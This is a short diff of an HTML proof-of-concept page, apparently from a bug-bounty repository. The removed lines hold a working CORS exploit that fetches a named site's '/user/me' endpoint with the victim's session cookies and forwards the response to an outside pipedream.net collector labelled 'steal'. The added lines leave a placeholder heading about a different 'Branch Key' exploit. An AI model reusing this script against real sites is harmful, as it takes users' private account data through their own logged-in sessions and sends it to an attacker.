@@ -1,20 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit</title>
+    <title></title>
 </head>
 <body>
-    <h2>Loading...</h2>
-    <script>
-        // Exploit: Send request to the vulnerable API and steal data
-        fetch("https://accounts-api.soco.id/user/me", {
-            credentials: "include" // Send victim's session cookies
-        })
-        .then(response => response.text()) // Extract response data
-        .then(data => {
-            // Send stolen data to attacker's server
-            fetch("https://eo4jfffzz6pk7y9.m.pipedream.net/steal?data=" + encodeURIComponent(data));
-        });
-    </script>
+    <h1>PoC for Branch Key Expoitation...</h1>
 </body>
 </html>
